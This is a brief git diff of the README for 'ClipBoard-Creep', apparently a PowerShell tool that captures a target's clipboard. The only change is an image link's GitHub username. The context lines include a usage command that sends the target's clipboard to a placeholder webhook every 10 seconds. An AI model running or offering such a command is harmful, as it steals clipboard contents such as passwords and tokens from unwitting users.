@@ -20,4 +20,4 @@ Output the targets clipboard into the console, every 12 seconds.
 Exfiltrate the targets clipboard content to a defined webhook every 10 seconds.
 ```Clipboard-Creep -Webhook "https://example.com/" -Sleep 10```
 
-![alt text](https://github.com/0iphor13/ClipBoard-Creep/blob/main/ClipBoard-Creep/media/clippy.png)
+![alt text](https://github.com/0i41E/ClipBoard-Creep/blob/main/ClipBoard-Creep/media/clippy.png)
